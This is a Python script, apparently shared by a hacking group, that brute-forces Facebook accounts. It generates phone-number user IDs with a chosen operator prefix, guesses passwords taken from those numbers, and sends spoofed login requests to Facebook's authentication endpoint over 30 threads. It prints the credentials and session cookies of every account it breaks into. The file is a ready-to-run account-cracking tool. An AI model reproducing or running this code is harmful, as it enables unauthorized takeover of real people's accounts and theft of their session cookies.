#===== SC DAVLOPER : ржЬрж╛ржЙрж░рж╛ ZUYAN ЁЯдгтШ║я╕П

#====== SC SEND BY > KALYAN KING

#====== TEAM : KGF CYBER TEAM
import os
try:
    import requests,rich,bs4,fake_useragent
except:
    os.system('pip install requests && pip install rich')
from rich import print
from rich.console import Console
from rich.panel import Panel
from concurrent.futures import ThreadPoolExecutor as tred
import requests
import random
import string
import uuid
import time
import sys
import re
#-----------------------#
R="[bold red]"
G="[bold green]"
Y="[bold yellow]"
B="[bold blue]"
M="[bold magenta]"
P="[bold violet]"
C="[bold cyan]"
W="[bold white]"
r="\033[1;31m"
g="\033[1;32m"
y="\033[1;33m"
b="\033[1;34m"
m="\033[1;35m"
c="\033[1;36m"
w="\033[1;37m"
X = "[bold green]<[bold white]+[bold green]>[bold white]"
os.system('espeak -v bn+f3 -a 120 -p 40 -s 100 "ржмрзЛржХрж╛ржЪрзЛржжрж╛ ржЬрзБрзЯрж╛ржи Script Wlacme рждрзЛржорж╛ржжрзЗрж░ ржХрж▓рзНржпрж╛ржи ржнрж╛ржЗ ржПржЗ Script ржЯрж╛ ржжрж┐ржЪрзНржЫрзЗ рждрзЛржорж╛рж░рж╛ ржЖржмрж╛рж░ ржЬрзБрзЯрж╛ржи ржмрзЛржХрж╛ржЪрзЛржжрзЗржХрзЗ ржмрж▓ржмрж╛ ржирж╛ ржПржЯрж╛ ржоржЬрж╛ ржХрж░рзЛ"')
#-----------------------#
logo = Panel(f"""
{X} CREATOR   : [bold green]MR ZUYAN  
{X} FRAMEWORK : [bold yellow]XVSOULX - ELITE  
{X} FACEBOOK  : [bold magenta]MR ZUYAN & ZUYANx  
{X} SECURITY  : [bold red]AI-POWERED SHIELD  
{X} SCRIPT SEND     : [bold blue]KALYAN KING
{X} TRUSTED   : [bold cyan]ELITE DEVELOPERS""",
title="[bold yellow]тЪб XVSOULX тЪб[/bold yellow]",
border_style="green1")
#-----------------------#
def clear():
    os.system("xdg-open https://t.me/KGF_WORLD_CYBER")
    os.system('clear')
#-----------------------#
def linex():
    print(f"{W}тАФтАФтАФтАФтАФтАФтАФтАФтАФтАФтАФтАФтАФтАФтАФтАФтАФтАФтАФтАФтАФтАФтАФтАФтАФтАФтАФтАФтАФтАФтАФ")
#-----------------------#
live = 0
cp = 0
loop = 0
numx = []
console = Console()
#-----------------------#
def ugenX():
    android_version = random.randint(10, 13)  # Random Android version
    build_number = f"QP1A.{random.randint(111111, 999999)}.{random.randint(111, 999)}"
    # Fixed device details from your provided UA
    density = 2.75
    width, height = 1080, 2220  
    # Random Facebook app version and build version
    fb_versions = [
        ("335.0.0.28.118", "316527966", "317757053"),
        ("347.0.0.3.161", "229145646", "318734599"),
        ("350.0.0.8.89", "318734599", "320456789")
    ]
    fb_version, fb_build, fb_rv = random.choice(fb_versions)
    # Generate User-Agent
    user_agent = (
        f"Mozilla/5.0 (Linux; Android {android_version}; Build/{build_number}) "
        f"AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(90, 120)}.0.0.0 Mobile Safari/537.36 "
        f"[FBAN/FB4A;FBAV/{fb_version};FBPN/com.facebook.katana;FBLC/ru_RU;FBBV/{fb_build};"
        f"FBCR/Bezlimit;FBMF/Xiaomi;FBBD/Redmi;FBDV/Redmi Note 8 Pro;FBSV/{android_version};"
        f"FBCA/armeabi-v7a:armeabi;FBDM/{{density={density},width={width},height={height}}};"
        f"FB_FW/1;FBRV/{fb_rv};]"
    )
    return user_agent

# Example Usage


def main():
    clear()
    console.print(logo)
    console.print(Panel("017/018/019/016", style="bold green1"))
    # Custom bottom-styled input
    console.print("тХнтФАтФА(тЪбXVSOULXтЪб)")
    code = console.input("тХ░тФАтФАтФАтФА> ")
    clear()
    console.print(logo)
    console.print(Panel('1000/2000/50000',style="bold green1"))
    console.print("тХнтФАтФА(тЪбXVSOULXтЪб)")
    limit = int(console.input("тХ░тФАтФАтФАтФА> "))
    for _ in range(limit):
        num = ''.join(random.choice(string.digits) for _ in range(8))
        numx.append(num)
    with tred(max_workers=30) as ZUYAN:
        clear()
        console.print(logo)
        console.print(Panel(f"{X} CODE : {code}\n{X} LIMIT : {limit}\n{X} CRACKING WITH ZUYAN"))
        for sex in numx:
            uid = code+sex
            pwx = [sex,uid,uid[:6],uid[:7],uid[:8],uid[5:]]
            ZUYAN.submit(crack,uid,pwx)

def crack(uid,pwx):
    global live,loop
    try:
        for pw in pwx:
            sys.stdout.write(f'\r{w}[{b}тЮд{w}] {y}CRACKING {w}[{g}{loop}{w}]<>[ALIVE:{g}{live}{w}]\r')
            sys.stdout.flush()
            data = {'adid': str(uuid.uuid4()),'format': 'json','device_id': str(uuid.uuid4()),'email': uid,'password': pw,'generate_analytics_claims': '1', 'community_id': '','cpl': 'true','try_num': '1','family_device_id': str(uuid.uuid4()),'credentials_type': 'password','source': 'login','error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false','generate_session_cookies': '1','generate_machine_id': '1','currently_logged_in_userid': '0','locale': 'en_GB','client_country_code': 'GB', 'fb_api_req_friendly_name': 'authenticate'}
            headers = {'User-Agent': ugenX(),'Accept-Encoding':  'gzip, deflate','Accept': '*/*', 'Connection': 'keep-alive','Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Friendly-Name': 'authenticate','X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),'X-FB-Net-HNI': str(random.randint(20000, 40000)),'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'X-FB-Connection-Type': 'unknown','Content-Type': 'application/x-www-form-urlencoded','X-FB-HTTP-Engine': 'Liger'}
            url = 'https://b-graph.facebook.com/auth/login'
            try:
                response = requests.post(url,data=data,headers=headers,allow_redirects=False).json()
                if 'session_key' in response:
                    coki = ";".join(i["name"]+"="+i["value"] for i in response["session_cookies"])
                    console.print(Panel(f"[bold green1]{uid} | {pw}\n[bold green1]cookies : {coki}"))
                    live+=1
                    break
                elif 'www.facebook.com' in response['error']['message']:
                    console.print(Panel(f"[bold yellow]{uid} | {pw}"))
                    break
            except Exception as e:
                pass
        loop+=1
    except Exception as e:
        pass

main()
